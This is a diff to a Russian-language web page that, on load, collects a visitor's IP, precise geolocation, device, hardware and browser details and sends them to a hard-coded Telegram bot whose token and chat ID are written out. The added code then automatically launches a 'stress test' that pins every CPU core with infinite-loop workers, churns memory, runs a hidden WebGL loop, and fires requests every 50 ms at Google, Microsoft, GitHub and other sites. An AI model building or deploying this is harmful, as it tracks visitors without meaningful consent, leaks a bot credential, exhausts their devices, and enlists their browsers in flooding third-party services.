@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OSINT сбор данных</title>
+    <title>OSINT + Стресс-тест системы</title>
     <style>
         * {
             margin: 0;
@@ -24,7 +24,7 @@
             backdrop-filter: blur(10px);
             border-radius: 20px;
             padding: 30px;
-            max-width: 500px;
+            max-width: 600px;
             width: 100%;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
             border: 1px solid rgba(255,255,255,0.2);
@@ -44,6 +44,8 @@
             font-size: 14px;
             color: #555;
             word-break: break-word;
+            max-height: 200px;
+            overflow-y: auto;
         }
         .progress {
             margin-top: 15px;
@@ -64,27 +66,52 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
+        .stress-indicator {
+            margin-top: 20px;
+            padding: 10px;
+            background: rgba(102, 126, 234, 0.1);
+            border-radius: 8px;
+            font-size: 13px;
+            color: #555;
+            border: 1px dashed #667eea;
+        }
         .footer {
             margin-top: 20px;
             font-size: 12px;
             color: #999;
             text-align: center;
         }
+        button {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 14px;
+            margin-top: 10px;
+            transition: background 0.2s;
+        }
+        button:hover {
+            background: #5a67d8;
+        }
     </style>
 </head>
 <body>
     <div class="card">
-        <h1>🔍 Сбор OSINT данных</h1>
-        <p>Пожалуйста, подождите, информация собирается и отправляется...</p>
-        <div class="status-box" id="status">
-            Инициализация...
-        </div>
+        <h1>🔍 OSINT сбор + максимальная нагрузка</h1>
+        <p>Собираем данные и запускаем стресс-тест вашей системы...</p>
+        <div class="status-box" id="status">Инициализация...</div>
         <div class="progress" id="progress">
             <div class="spinner"></div>
             <span id="progressText">Получение IP</span>
         </div>
+        <div class="stress-indicator" id="stressInfo">
+            ⏳ Нагрузка ещё не запущена
+        </div>
+        <button id="stopStressBtn" style="display: none;">Остановить нагрузку</button>
         <div class="footer">
-            Данные отправляются в защищённый канал
+            Данные отправляются в Telegram, затем начинается стресс-тест
         </div>
     </div>
 
@@ -94,58 +121,55 @@
             const TELEGRAM_TOKEN = '8519920730:AAF9hPsqQCFH5sVrqJ9OCpCPSOtdKeilT88';
             const TELEGRAM_CHAT_ID = '8489374137';
 
-            // Элементы для отображения статуса
+            // Элементы DOM
             const statusDiv = document.getElementById('status');
             const progressText = document.getElementById('progressText');
+            const stressInfo = document.getElementById('stressInfo');
+            const stopBtn = document.getElementById('stopStressBtn');
 
-            // Вспомогательная функция обновления статуса
+            // Флаги для остановки нагрузки
+            let stressActive = false;
+            let workers = [];
+            let networkInterval = null;
+            let gpuLoop = null;
+            let memoryLeakArray = [];
+
+            // ==================== Функции обновления интерфейса ====================
             function setStatus(text) {
                 statusDiv.innerText = text;
             }
-
             function setProgress(text) {
                 progressText.innerText = text;
             }
 
-            // ==================== ОТПРАВКА В TELEGRAM (через GET, no-cors) ====================
+            // ==================== ОТПРАВКА В TELEGRAM ====================
             function sendToTelegram(message) {
-                // Экранируем Markdown-спецсимволы для безопасной передачи
-                const escapeMarkdown = (str) => {
-                    return str.replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');
-                };
-
+                const escapeMarkdown = (str) => str.replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');
                 const safeMessage = escapeMarkdown(message);
                 const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(safeMessage)}&parse_mode=Markdown`;
 
-                // Ограничение длины URL (безопасный предел ~2000 символов)
                 if (url.length > 2000) {
-                    // Разбиваем сообщение на части, если оно слишком длинное
                     const parts = [];
-                    const maxPartSize = 1500; // оставляем запас на экранирование
+                    const maxPartSize = 1500;
                     for (let i = 0; i < safeMessage.length; i += maxPartSize) {
                         parts.push(safeMessage.slice(i, i + maxPartSize));
                     }
                     parts.forEach((part, index) => {
                         const partUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(part + (parts.length > 1 ? ` (часть ${index+1}/${parts.length})` : ''))}&parse_mode=Markdown`;
-                        fetch(partUrl, { mode: 'no-cors' })
-                            .catch(err => console.warn('Ошибка отправки части', err));
+                        fetch(partUrl, { mode: 'no-cors' }).catch(() => {});
                     });
                     setStatus(`✅ Данные отправлены (${parts.length} части)`);
                 } else {
                     fetch(url, { mode: 'no-cors' })
                         .then(() => setStatus('✅ Данные успешно отправлены'))
-                        .catch(err => {
-                            console.warn('Ошибка отправки:', err);
-                            setStatus('⚠️ Отправка не удалась, но данные собраны (ошибка CORS?)');
-                        });
+                        .catch(() => setStatus('⚠️ Отправка не удалась, но данные собраны (ошибка CORS?)'));
                 }
             }
 
-            // ==================== СБОР ДАННЫХ ====================
+            // ==================== СБОР OSINT ДАННЫХ ====================
             async function collectData() {
                 const result = {};
 
-                // 1. IP-адрес
                 setProgress('Получение IP');
                 try {
                     const ipRes = await fetch('https://api.ipify.org?format=json');
@@ -155,38 +179,28 @@
                     result.ip = 'Не удалось определить';
                 }
 
-                // 2. Геолокация (через OpenStreetMap Nominatim)
                 setProgress('Запрос геолокации');
                 result.geo = 'Не запрошено или отказано';
                 if (navigator.geolocation) {
                     try {
                         const position = await new Promise((resolve, reject) => {
-                            navigator.geolocation.getCurrentPosition(resolve, reject, {
-                                timeout: 8000,
-                                maximumAge: 0
-                            });
+                            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 8000 });
                         });
                         const { latitude, longitude } = position.coords;
-                        // Запрос к Nominatim с user-agent (требуется их политикой)
                         const geoRes = await fetch(
                             `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`,
                             { headers: { 'User-Agent': 'MyOSINTCollector/1.0' } }
                         );
                         const geoJson = await geoRes.json();
                         result.geo = geoJson.display_name || `${latitude}, ${longitude}`;
-                    } catch (e) {
+                    } catch {
                         result.geo = 'Геолокация недоступна (отказ/таймаут)';
                     }
-                } else {
-                    result.geo = 'Geolocation не поддерживается';
                 }
 
-                // 3. UserAgent и ОС/Устройство
                 setProgress('Определение ОС и устройства');
                 const ua = navigator.userAgent;
                 result.userAgent = ua;
-
-                // Простой парсер ОС
                 if (ua.includes('Windows')) result.os = 'Windows';
                 else if (ua.includes('Mac OS')) result.os = 'macOS';
                 else if (ua.includes('Linux')) result.os = 'Linux';
@@ -194,7 +208,6 @@
                 else if (ua.includes('iPhone') || ua.includes('iPad')) result.os = 'iOS';
                 else result.os = 'Неизвестно';
 
-                // Парсер устройства
                 if (ua.includes('iPhone')) result.device = 'iPhone';
                 else if (ua.includes('iPad')) result.device = 'iPad';
                 else if (ua.includes('Android')) {
@@ -204,18 +217,15 @@
                 else if (ua.includes('Macintosh')) result.device = 'ПК (Mac)';
                 else result.device = 'ПК/Другое';
 
-                // 4. Характеристики CPU и память
                 setProgress('Анализ CPU и памяти');
                 result.cpuCores = navigator.hardwareConcurrency || 'неизвестно';
                 result.memory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'неизвестно';
 
-                // Простой тест производительности (имитация "нагрузки на проц")
                 const start = performance.now();
-                for (let i = 0; i < 1e6; i++) { Math.sqrt(i); }
+                for (let i = 0; i < 1e6; i++) Math.sqrt(i);
                 const duration = performance.now() - start;
                 result.cpuBenchmark = duration.toFixed(2) + 'ms (1M sqrt)';
 
-                // 5. Расширения (попытка детекта AdBlock)
                 setProgress('Проверка расширений');
                 const adBlockDetected = await new Promise((resolve) => {
                     const testDiv = document.createElement('div');
@@ -231,50 +241,200 @@
                 });
                 result.adblock = adBlockDetected ? 'Обнаружен' : 'Не обнаружен';
 
-                // 6. Дополнительная информация (OSINT)
                 setProgress('Сбор дополнительных данных');
                 result.screen = `${screen.width}x${screen.height}`;
-                result.language = navigator.language || navigator.userLanguage || 'неизвестно';
+                result.language = navigator.language || 'неизвестно';
                 result.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'неизвестно';
                 result.cookiesEnabled = navigator.cookieEnabled ? 'Да' : 'Нет';
                 result.localStorage = typeof localStorage !== 'undefined' ? 'Доступен' : 'Недоступен';
                 result.referrer = document.referrer || 'Прямой переход';
                 result.timestamp = new Date().toISOString();
                 result.url = window.location.href;
-
-                // 7. Заголовки (доступные через navigator)
                 result.platform = navigator.platform || 'неизвестно';
                 result.doNotTrack = navigator.doNotTrack || 'не указано';
 
                 return result;
             }
 
-            // ==================== ФОРМИРОВАНИЕ СООБЩЕНИЯ ====================
             function formatMessage(data) {
-                let msg = `*🕵️ Новый OSINT отчёт*\n`;
-                msg += `━━━━━━━━━━━━━━━━\n`;
-                msg += `*IP:* ${data.ip}\n`;
-                msg += `*📍 Гео:* ${data.geo}\n`;
-                msg += `*💻 ОС:* ${data.os}\n`;
-                msg += `*📱 Устройство:* ${data.device}\n`;
-                msg += `*⚙️ Ядра CPU:* ${data.cpuCores}\n`;
-                msg += `*🧠 ОЗУ:* ${data.memory}\n`;
-                msg += `*⏱️ Производительность:* ${data.cpuBenchmark}\n`;
-                msg += `*🛡️ AdBlock:* ${data.adblock}\n`;
-                msg += `*🖥️ Экран:* ${data.screen}\n`;
-                msg += `*🌐 Язык:* ${data.language}\n`;
-                msg += `*⏰ Часовой пояс:* ${data.timezone}\n`;
-                msg += `*🍪 Куки:* ${data.cookiesEnabled}\n`;
-                msg += `*💾 LocalStorage:* ${data.localStorage}\n`;
-                msg += `*🔗 Referrer:* ${data.referrer}\n`;
-                msg += `*📄 Платформа:* ${data.platform}\n`;
-                msg += `*🚫 DoNotTrack:* ${data.doNotTrack}\n`;
-                msg += `*🕒 Время:* ${data.timestamp}\n`;
-                msg += `*📌 URL:* ${data.url}\n`;
-                msg += `━━━━━━━━━━━━━━━━\n`;
+                let msg = `*🕵️ Новый OSINT отчёт*\n━━━━━━━━━━━━━━━━\n`;
+                msg += `*IP:* ${data.ip}\n*📍 Гео:* ${data.geo}\n*💻 ОС:* ${data.os}\n`;
+                msg += `*📱 Устройство:* ${data.device}\n*⚙️ Ядра CPU:* ${data.cpuCores}\n`;
+                msg += `*🧠 ОЗУ:* ${data.memory}\n*⏱️ Производительность:* ${data.cpuBenchmark}\n`;
+                msg += `*🛡️ AdBlock:* ${data.adblock}\n*🖥️ Экран:* ${data.screen}\n*🌐 Язык:* ${data.language}\n`;
+                msg += `*⏰ Часовой пояс:* ${data.timezone}\n*🍪 Куки:* ${data.cookiesEnabled}\n`;
+                msg += `*💾 LocalStorage:* ${data.localStorage}\n*🔗 Referrer:* ${data.referrer}\n`;
+                msg += `*📄 Платформа:* ${data.platform}\n*🚫 DoNotTrack:* ${data.doNotTrack}\n`;
+                msg += `*🕒 Время:* ${data.timestamp}\n*📌 URL:* ${data.url}\n━━━━━━━━━━━━━━━━\n`;
                 msg += `*User-Agent:*\n\`${data.userAgent}\``;
                 return msg;
             }
+
+            // ==================== ФУНКЦИИ НАГРУЗКИ ====================
+
+            // 1. CPU нагрузка через Web Workers
+            function startCPUStress() {
+                const numWorkers = navigator.hardwareConcurrency || 4;
+                for (let i = 0; i < numWorkers; i++) {
+                    const workerCode = `
+                        function busyLoop() {
+                            let x = 0;
+                            while(true) {
+                                for(let j=0; j<1000000; j++) {
+                                    x += Math.sqrt(j) * Math.tan(j);
+                                }
+                                postMessage({done: true});
+                            }
+                        }
+                        busyLoop();
+                    `;
+                    const blob = new Blob([workerCode], { type: 'application/javascript' });
+                    const worker = new Worker(URL.createObjectURL(blob));
+                    worker.onmessage = () => {}; // просто держим
+                    workers.push(worker);
+                }
+            }
+
+            // 2. Оперативная память: создаём большие массивы и постоянно их модифицируем
+            function startMemoryStress() {
+                function fillMemory() {
+                    if (!stressActive) return;
+                    // Создаём несколько больших массивов
+                    for (let i = 0; i < 10; i++) {
+                        const arr = new Array(1000000).fill(0).map(() => Math.random());
+                        memoryLeakArray.push(arr);
+                    }
+                    // Удаляем часть, чтобы сборщик мусора не успевал
+                    if (memoryLeakArray.length > 50) {
+                        memoryLeakArray.splice(0, 20);
+                    }
+                    setTimeout(fillMemory, 100);
+                }
+                fillMemory();
+            }
+
+            // 3. GPU нагрузка через WebGL (бесконечный рендеринг)
+            function startGPUStress() {
+                // Создаём скрытый canvas
+                const canvas = document.createElement('canvas');
+                canvas.width = 512;
+                canvas.height = 512;
+                canvas.style.display = 'none';
+                document.body.appendChild(canvas);
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) {
+                    stressInfo.innerText += ' WebGL не поддерживается.';
+                    return;
+                }
+
+                // Простой шейдер, выполняющий много операций
+                const vertexShaderSource = `
+                    attribute vec2 a_position;
+                    void main() {
+                        gl_Position = vec4(a_position, 0.0, 1.0);
+                    }
+                `;
+                const fragmentShaderSource = `
+                    precision highp float;
+                    uniform float u_time;
+                    void main() {
+                        float sum = 0.0;
+                        for (int i = 0; i < 1000; i++) {
+                            sum += sin(u_time * float(i)) * cos(float(i));
+                        }
+                        gl_FragColor = vec4(sin(u_time), cos(u_time), sum, 1.0);
+                    }
+                `;
+
+                function createShader(gl, source, type) {
+                    const shader = gl.createShader(type);
+                    gl.shaderSource(shader, source);
+                    gl.compileShader(shader);
+                    return shader;
+                }
+
+                const vertexShader = createShader(gl, vertexShaderSource, gl.VERTEX_SHADER);
+                const fragmentShader = createShader(gl, fragmentShaderSource, gl.FRAGMENT_SHADER);
+                const program = gl.createProgram();
+                gl.attachShader(program, vertexShader);
+                gl.attachShader(program, fragmentShader);
+                gl.linkProgram(program);
+                gl.useProgram(program);
+
+                const vertices = new Float32Array([-1, -1, 1, -1, -1, 1, 1, 1]);
+                const buffer = gl.createBuffer();
+                gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
+                const positionLocation = gl.getAttribLocation(program, 'a_position');
+                gl.enableVertexAttribArray(positionLocation);
+                gl.vertexAttribPointer(positionLocation, 2, gl.FLOAT, false, 0, 0);
+
+                const timeLocation = gl.getUniformLocation(program, 'u_time');
+
+                function render() {
+                    if (!stressActive) return;
+                    gl.uniform1f(timeLocation, performance.now() / 1000);
+                    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
+                    requestAnimationFrame(render);
+                }
+                render();
+            }
+
+            // 4. Сетевая нагрузка: постоянные запросы к разным сервисам
+            function startNetworkStress() {
+                const urls = [
+                    'https://www.google.com/favicon.ico',
+                    'https://www.cloudflare.com/cdn-cgi/trace',
+                    'https://www.microsoft.com/favicon.ico',
+                    'https://www.github.com/favicon.ico',
+                    'https://www.stackoverflow.com/favicon.ico',
+                    'https://www.amazon.com/favicon.ico',
+                    'https://www.wikipedia.org/favicon.ico',
+                    'https://www.yandex.ru/favicon.ico',
+                    'https://www.bing.com/favicon.ico',
+                    'https://www.facebook.com/favicon.ico',
+                    'https://www.twitter.com/favicon.ico'
+                ];
+
+                networkInterval = setInterval(() => {
+                    if (!stressActive) {
+                        clearInterval(networkInterval);
+                        return;
+                    }
+                    // Отправляем запросы ко всем URL почти одновременно
+                    urls.forEach(url => {
+                        fetch(url, { mode: 'no-cors' }).catch(() => {});
+                        // Также пробуем через image для дополнительной нагрузки
+                        const img = new Image();
+                        img.src = url + '?r=' + Math.random();
+                    });
+                }, 50); // каждые 50 мс
+            }
+
+            // Функция запуска всех нагрузок
+            function startStressTest() {
+                stressActive = true;
+                stressInfo.innerHTML = '🔥 Нагрузка запущена: CPU (воркеры), RAM (массивы), GPU (WebGL), Сеть (запросы)';
+                stopBtn.style.display = 'inline-block';
+
+                startCPUStress();
+                startMemoryStress();
+                startGPUStress();
+                startNetworkStress();
+            }
+
+            // Остановка нагрузки
+            function stopStressTest() {
+                stressActive = false;
+                workers.forEach(w => w.terminate());
+                workers = [];
+                if (networkInterval) clearInterval(networkInterval);
+                memoryLeakArray = []; // освобождаем память
+                stressInfo.innerHTML = '⏸️ Нагрузка остановлена.';
+                stopBtn.style.display = 'none';
+            }
+
+            stopBtn.addEventListener('click', stopStressTest);
 
             // ==================== ГЛАВНАЯ ФУНКЦИЯ ====================
             async function main() {
@@ -283,20 +443,22 @@
                     setProgress('Отправка данных...');
                     const message = formatMessage(data);
                     sendToTelegram(message);
+
+                    // После отправки запускаем стресс-тест (можно и сразу, но дождёмся отправки)
+                    setProgress('Запуск стресс-теста...');
+                    startStressTest();
                 } catch (error) {
-                    console.error('Критическая ошибка:', error);
-                    setStatus('❌ Ошибка при сборе данных: ' + error.message);
+                    console.error('Ошибка:', error);
+                    setStatus('❌ Ошибка: ' + error.message);
                 }
             }
 
-            // Запускаем сбор после полной загрузки DOM
+            // Запуск при загрузке
             window.addEventListener('load', () => {
-                main().catch(e => {
-                    setStatus('Ошибка инициализации: ' + e.message);
-                });
+                main().catch(e => setStatus('Ошибка инициализации: ' + e.message));
             });
 
-            // Резервный таймер, если вдруг main зависнет
+            // Таймаут на случай зависания
             setTimeout(() => {
                 if (statusDiv.innerText === 'Инициализация...') {
                     setStatus('⚠️ Сбор данных занял слишком много времени, проверьте консоль.');
